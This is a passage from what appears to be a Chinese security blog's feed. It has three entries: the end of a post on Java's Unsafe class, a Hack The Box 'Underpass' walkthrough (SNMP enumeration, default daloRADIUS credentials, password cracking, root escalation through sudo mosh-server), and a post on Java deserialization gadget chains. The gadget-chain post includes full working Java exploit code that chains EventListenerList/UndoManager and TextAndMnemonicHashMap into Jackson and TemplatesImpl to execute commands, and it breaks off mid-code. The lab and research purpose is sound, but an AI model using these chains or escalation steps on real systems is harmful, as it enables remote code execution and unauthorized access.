class="keyword">native</span> <span class="type">long</span> <span class="title function_">staticFieldOffset</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">//获取一个静态字段的对象指针</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">staticFieldBase</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">//判断是否需要初始化一个类，通常在获取一个类的静态属性的时候（因为一个类如果没初始化，它的静态属性也不会初始化）使用。 当且仅当ensureClassInitialized方法不生效时返回false</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">shouldBeInitialized</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br><span class="line"><span class="comment">//确保类被初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br><span class="line"><span class="comment">//定义一个类，可用于动态创建类，此方法会跳过JVM的所有安全检查，默认情况下，ClassLoader（类加载器）和ProtectionDomain（保护域）实例来源于调用者</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,</span><br><span class="line">                                   ClassLoader loader,</span><br><span class="line">                                   ProtectionDomain protectionDomain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个匿名类，可用于动态创建类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineAnonymousClass(Class&lt;?&gt; hostClass, <span class="type">byte</span>[] data, Object[] cpPatches);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有一些绕过RASP的方式因为还没学到那里暂时占个坑以后补，最后也来一个其他大佬的图</p><img src="/post/41c7b783/IMAGE20250201215903024.png" class=""><p>参考：<br><a href="https://www.javasec.org/javase/Unsafe/">https://www.javasec.org/javase/Unsafe/</a><br><a href="https://www.cnblogs.com/bitterz/p/15952315.html">https://www.cnblogs.com/bitterz/p/15952315.html</a><br><a href="https://paper.seebug.org/1785/">https://paper.seebug.org/1785/</a><br><a href="https://www.cnblogs.com/nice0e3/p/14102892.html">https://www.cnblogs.com/nice0e3/p/14102892.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;sun.misc.Unsafe&lt;/code&gt;是Java底层API(&lt;code&gt;仅限Java内部使用,反射可调用&lt;/code&gt;)提供的一个神奇的Java类，&lt;code&gt;Unsafe&lt;/code&gt;提供了非常底层的&lt;code&gt;内</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java基础" scheme="https://oceanzbz.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Underpass-HTB</title>
    <link href="https://oceanzbz.github.io/post/ba59ced.html"/>
    <id>https://oceanzbz.github.io/post/ba59ced.html</id>
    <published>2025-02-01T05:37:06.000Z</published>
    <updated>2025-03-05T07:24:36.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><h3 id="端口扫描">端口扫描</h3><p><code>nmap -sV -sC -O  10.10.11.48 </code></p><img src="/post/ba59ced/IMAGE20250201133818799.png" class=""><p><code>nmap -sU  --top-ports 100 10.10.11.48</code> UDP扫描</p><img src="/post/ba59ced/IMAGE20250201133829161.png" class=""><p>可以看到有一个snmp服务开放之前没碰到过去google一下<br>参考：<br><a href="https://www.cnblogs.com/xdp-gacl/p/3978825.html">https://www.cnblogs.com/xdp-gacl/p/3978825.html</a></p><p>这里我们可以使用MSF进行收集也可以使用snmpwalk进行MIB库遍历<br><code>snmpwalk -c public -v2c 10.10.11.48</code></p><img src="/post/ba59ced/IMAGE20250201134358641.png" class=""><p>看到daloradius服务是什么东西去搜搜<br><a href="https://blog.csdn.net/weixin_44517454/article/details/138281818">https://blog.csdn.net/weixin_44517454/article/details/138281818</a><br>可以得到默认用户名和密码 <code>administrator/radius</code></p><h3 id="目录扫描">目录扫描</h3><p><code>dirsearch -u http://underpass.htb/daloradius</code></p><img src="/post/ba59ced/IMAGE20250201135434030.png" class=""><p>没有利用点在深度扫描一遍</p><img src="/post/ba59ced/IMAGE20250201135626195.png" class=""><img src="/post/ba59ced/IMAGE20250201135707107.png" class=""><p>发现登录框，使用前面找到的默认用户名和密码登录试试，好像登录不进去。在换一个字典扫描试试还有其他的路由吗？</p><img src="/post/ba59ced/IMAGE20250201140819316.png" class=""><p>使用这个路由登录进后台</p><img src="/post/ba59ced/IMAGE20250201141001806.png" class=""><p>找到一个用户和加密的密码，破解一下，使用如下网站<br><a href="https://crackstation.net/">https://crackstation.net/</a></p><img src="/post/ba59ced/IMAGE20250201141208282.png" class=""><p>所以可以直接登录可以获得一个flag。接下来提权</p><h2 id="提权">提权</h2><img src="/post/ba59ced/IMAGE20250201141419348.png" class=""><p>可以看到有一个可执行文件能够以root身份启动。来了解下这个mosh-server是什么<br><a href="https://www.cnblogs.com/sunweiye/p/12003616.html">https://www.cnblogs.com/sunweiye/p/12003616.html</a></p><p>所以先以root身份新开一个端口<br><code>sudo /usr/bin/mosh-server new -p 60006</code><br>然后在连接<br><code>export MOSH_KEY=Fzv8LjPRNbkPQKwJDsn0sw</code><br><code>mosh-client 127.0.0.1 60006</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;h3 id=&quot;端口扫描&quot;&gt;端口扫描&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nmap -sV -sC -O  10.10.11.48 &lt;/code&gt;&lt;/p&gt;
&lt;img src=&quot;/post/ba59ced/IMAGE2025020113381</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
    <category term="Linux" scheme="https://oceanzbz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>toString新链</title>
    <link href="https://oceanzbz.github.io/post/d446890f.html"/>
    <id>https://oceanzbz.github.io/post/d446890f.html</id>
    <published>2025-01-30T12:32:58.000Z</published>
    <updated>2025-03-05T07:24:36.800Z</updated>
    
    <content type="html"><![CDATA[<p>之前在学习jackson反序列化时通用链是利用的toString方法去触发的而平常通用的就是<code>BadAttributeValueExpException</code>作为toString的入口。但是之前也看到过其他的绕过方法但是没有记录今天来记录两条新的分别是<code>EventListenerList</code>和<code>TextAndMnemonicHashMap</code></p><p>参考：<br><a href="https://mp.weixin.qq.com/s/cqntHdPy0b-W0ozNilVMsQ">https://mp.weixin.qq.com/s/cqntHdPy0b-W0ozNilVMsQ</a></p><h2 id="EventListenerList链">EventListenerList链</h2><p>来分析一波这个是如何触发toString方法的。先来看看其readObject方法</p><img src="/post/d446890f/IMAGE20250130203918014.png" class=""><p>其中的关键点已经用箭头指出来了。这里会有一个强转要求是<code>EventListener</code>接口，然后会调用add方法。这里跟到add方法中看看</p><img src="/post/d446890f/IMAGE20250130204129453.png" class=""><p>这里会和t对象做一个比较如果不是就会抛出异常，其实重点就在这里第一次看别的师傅的博客的时候也没明白过来。就是这里会有一个隐式转换调用toString方法因为用的是字符串拼接。这里找到一个<code>UndoManager</code>这个类它实现了<code>UndoableEditListener</code>接口而该接口继承自<code>EventListener</code>接口，所以符合要求。来看看<code>UndoManager</code>这个类的toString方法</p><img src="/post/d446890f/IMAGE20250130204537730.png" class=""><p>这里<code>limit</code> 还有<code>indexOfNextAdd</code>属性都是int类型没啥用重点在其父类的<code>toString</code>方法中跟进看看</p><img src="/post/d446890f/IMAGE20250130204646366.png" class=""><img src="/post/d446890f/IMAGE20250130204710250.png" class=""><p>重点是<code>edits</code>这个属性他是<code>Vector</code>类型的而这里也用了字符串拼接，所以还是会隐式调用<code>toString</code>方法。所以看看其<code>toString</code>方法</p><img src="/post/d446890f/IMAGE20250130204843370.png" class=""><p>继续看其父类的toString方法</p><img src="/post/d446890f/IMAGE20250130204911714.png" class=""><p>可以看到这里调用了StringBuilder类的append方法，跟进</p><img src="/post/d446890f/IMAGE20250130204950525.png" class=""><p>跟进valueOf</p><img src="/post/d446890f/IMAGE20250130205014134.png" class=""><p>obj可控且调用toString方法，所以就可以拼接下后面的jackson了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.Vector;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// javassist 修改 BaseJsonNode            ClassPool classPool = ClassPool.getDefault();  </span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);  </span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);  </span><br><span class="line">            writeReplace.setBody(<span class="string">&quot;return $0;&quot;</span>);  </span><br><span class="line">            ctClass.writeFile();  </span><br><span class="line">            ctClass.toClass();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>();  </span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;  </span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();  </span><br><span class="line">        cc.setName(randomClassName);  </span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));  </span><br><span class="line">        <span class="type">byte</span>[] codes = cc.toBytecode();  </span><br><span class="line">  </span><br><span class="line">        setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);  </span><br><span class="line">        setFieldValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//使用 Spring AOP 中的 JdkDynamicAopProxy,确保只触发 getOutputProperties        AdvisedSupport advisedSupport = new AdvisedSupport();  </span></span><br><span class="line">        advisedSupport.setTarget(templatesimpl);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);  </span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();  </span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">undoManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(undoManager, <span class="string">&quot;edits&quot;</span>);  </span><br><span class="line">        vector.add(pojoNode);  </span><br><span class="line">        setFieldValue(eventListenerList, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);  </span><br><span class="line">        oos.writeObject(eventListenerList);  </span><br><span class="line">        oos.close();  </span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray())));  </span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray())).length());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);  </span><br><span class="line">        ois.readObject();  </span><br><span class="line">        ois.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);  </span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )  </span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )  </span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> field;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;  </span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;  </span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">throw</span> e;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">valueOf:<span class="number">2994</span>, String (java.lang) [<span class="number">3</span>]</span><br><span class="line">append:<span class="number">131</span>, StringBuilder (java.lang)</span><br><span class="line">toString:<span class="number">462</span>, AbstractCollection (java.util)</span><br><span class="line">toString:<span class="number">1000</span>, Vector (java.util)</span><br><span class="line">valueOf:<span class="number">2994</span>, String (java.lang) [<span class="number">2</span>]</span><br><span class="line">append:<span class="number">131</span>, StringBuilder (java.lang)</span><br><span class="line">toString:<span class="number">258</span>, CompoundEdit (javax.swing.undo)</span><br><span class="line">toString:<span class="number">621</span>, UndoManager (javax.swing.undo)</span><br><span class="line">valueOf:<span class="number">2994</span>, String (java.lang) [<span class="number">1</span>]</span><br><span class="line">append:<span class="number">131</span>, StringBuilder (java.lang)</span><br><span class="line">add:<span class="number">187</span>, EventListenerList (javax.swing.event)</span><br><span class="line">readObject:<span class="number">277</span>, EventListenerList (javax.swing.event)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">80</span>, test (org.example)</span><br></pre></td></tr></table></figure><h2 id="TextAndMnemonicHashMap链">TextAndMnemonicHashMap链</h2><p>在UIDefaults的子类TextAndMnemonicHashMap类中，存在get方法能够接收一个key参数，当在HashMap中通过get方法取这个key最终结果为空时，就会触发key.toString()从而触发toString()方法。</p><img src="/post/d446890f/IMAGE20250130213011663.png" class=""><p>在AbstractMap#equals方法中，在遍历键值对的时候，当键值对遍历时，其中的value为空，就会触发m.get()方法。</p><img src="/post/d446890f/IMAGE20250130213259593.png" class=""><p>然后找一个readobject方法中调用了equals方法的类，熟知的有hashtable的reconstitutionPut方法还有hashmap的putval方法，先来看hashtable</p><h3 id="HashTable">HashTable</h3><img src="/post/d446890f/IMAGE20250130213648201.png" class=""><p>看到会掉用reconstitutionPut方法，而该方法中调用了equals方法所以后面在拼接jackson就可以闭环。</p><img src="/post/d446890f/IMAGE20250130213748152.png" class=""><p>这里解释下为什么javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;的键能够触发AbstractMap的equals方法，因为TextAndMnemonicHashMap继承于HashMap，HashMap继承于AbstractMap并且HashMap没有实现equals方法，最终就是找到AbstractMap中的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> javassist.*;  </span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">        ClassPool.getDefault().insertClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(ser.class.getClassLoader()));  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().getCtClass(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);  </span><br><span class="line">        <span class="comment">// 获取原方法  </span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">originalMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);  </span><br><span class="line">        <span class="comment">// 修改方法名  </span></span><br><span class="line">        originalMethod.setName(<span class="string">&quot;Replace&quot;</span>);  </span><br><span class="line">        <span class="comment">// 加载修改后的类  </span></span><br><span class="line">        ctClass.toClass();  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;gaoren&quot;</span>);  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());  </span><br><span class="line">        clazz.setSuperclass(superClass);  </span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, 